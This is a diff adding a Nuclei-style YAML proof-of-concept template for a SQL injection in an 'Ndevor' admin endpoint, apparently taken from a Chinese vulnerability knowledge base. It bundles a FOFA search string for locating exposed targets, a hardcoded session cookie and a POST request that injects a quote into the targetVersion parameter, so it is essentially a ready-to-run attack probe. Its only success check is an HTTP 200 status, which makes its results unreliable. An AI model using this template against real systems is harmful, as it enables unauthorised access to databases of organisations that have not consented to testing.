@@ -1,0 +1,30 @@
+id: poc-rw694o05ci46kn8g
+info:
+  name: 自动识别技术 Ndevor 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rw694o05ci46kn8g'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rw694o05ci46kn8g
+    fofa: title="Ndevor"
+http:
+- raw:
+  - 'POST /admin/monitor/systemfile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: session_user="VrhFVJS2SgewvZrFcwCawA=="
+
+    Content-Length: 118
+
+
+    attr.targetVersion=''&attr.deltaVersion=&attr.fullVersion=&search=&totalRecords=1&pageNo=1&recordsperpage=10&length=10'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
